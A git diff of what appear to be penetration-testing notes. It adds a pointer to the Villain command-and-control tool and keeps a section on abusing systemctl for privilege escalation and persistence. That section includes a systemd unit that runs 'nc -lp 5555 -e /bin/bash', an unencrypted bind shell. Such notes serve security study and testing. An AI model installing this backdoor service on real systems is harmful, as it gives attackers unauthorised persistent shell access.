@@ -50,9 +50,11 @@ stty rows <nbrows>
 stty cols <nbcols>
 ```
 
-## Linux
+## Command an Control
 
-### Systemctl
+[Villain](https://github.com/t3l3machus/Villain) is like a very light C2.
+
+## Systemctl
 
 If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance. It starts a service serving a **non encrypted** shell on the given port.
 
@@ -63,4 +65,3 @@ ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
 [Install]
 WantedBy=multi-user.target
 ```
-
